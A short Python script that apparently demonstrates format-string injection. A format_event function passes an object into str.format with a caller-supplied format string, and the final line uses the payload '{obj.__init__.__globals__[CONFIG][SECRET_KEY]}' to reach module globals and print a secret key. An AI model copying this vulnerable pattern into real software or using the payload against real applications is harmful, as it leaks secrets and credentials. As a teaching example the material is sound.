CONFIG = {
    'SECRET_KEY': 'super secret key'
}

class Event(object):
    def __init__(self, id, level, message):
        self.id = id
        self.level = level
        self.message = message

def format_event(format_string, evt):
    return format_string.format(obj=evt)

eventA = Event(123, 4, 'Hai')
print(format_event('{obj.__init__.__globals__[CONFIG][SECRET_KEY]}', eventA))
